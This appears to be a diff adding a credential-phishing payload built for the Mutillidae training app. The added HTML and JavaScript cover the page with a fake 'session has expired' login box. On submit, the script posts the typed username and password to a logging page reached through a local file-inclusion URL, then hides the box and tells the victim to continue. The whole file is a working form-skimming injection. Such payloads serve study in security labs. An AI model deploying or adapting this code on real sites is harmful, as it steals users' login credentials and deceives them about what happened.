@@ -1,0 +1,52 @@
+<div id="modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;opacity:.5;z-index:999998;">&nbsp;</div>
+<div style="margin:5% auto;width:100%;position:fixed;top:5%;left:5%;z-index:9999999;">
+<div id="idlogin" style="width:405px;position:relative;margin:0 auto;background-color:white;padding:10px;border:1px solid black;">
+<script>
+function capture(theForm){
+    var lXMLHTTP;
+    try{
+        var lData = "username=" + theForm.username.value + "&password=" + theForm.password.value;
+        var lHost = "localhost";
+        var lProtocol = "http";
+        var lAction = lProtocol + "://" + lHost + "/mutillidae/index.php?page=/var/folders/f8/xnsybzd969g24hyz9f7n_07m0000gn/T/insert.php";
+        var lMethod = "post";
+        try{
+            lXMLHTTP = new ActiveXObject("Msxml2.XMLHTTP");
+        }catch (e){
+            try{
+                lXMLHTTP = new ActiveXObject("Microsoft.XMLHTTP");
+            }catch(e) {
+                try{
+                    lXMLHTTP = new XMLHttpRequest();
+                }catch (e) {
+                    alert(e.message);
+                };//end try
+            };//end try
+        };//end try
+
+        lXMLHTTP.onreadystatechange = function(){
+            if(lXMLHTTP.readyState == 4){
+                theForm.parentNode.style.display="none";
+            }// end if
+        };
+
+        lXMLHTTP.open(lMethod, lAction, true);
+        lXMLHTTP.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        lXMLHTTP.send(lData);
+    }catch(e){
+        alert(e.message);
+    };
+    alert('Thanks! You may continue now.');
+    document.getElementById('modal').setAttribute('style', '');
+};//end function
+</script>
+<form>
+    <table style="font-weight:bold;">
+        <tbody><tr><td colspan="2" style="font-size:20px;">Sorry! Your session has expired.<br><br>Please login again.</td></tr>
+        <tr><td colspan="2">&nbsp;</td></tr>
+        <tr><td>Username</td><td><input name="username" type="text"></td></tr>
+        <tr><td>Password</td><td><input name="password" type="password"></td></tr>
+        <tr><td colspan="2" style="text-align:center;"><input type="button" onclick="javascript:capture(this.form);" value="      Submit      "></td></tr>
+    </tbody></table>
+</form>
+</div>
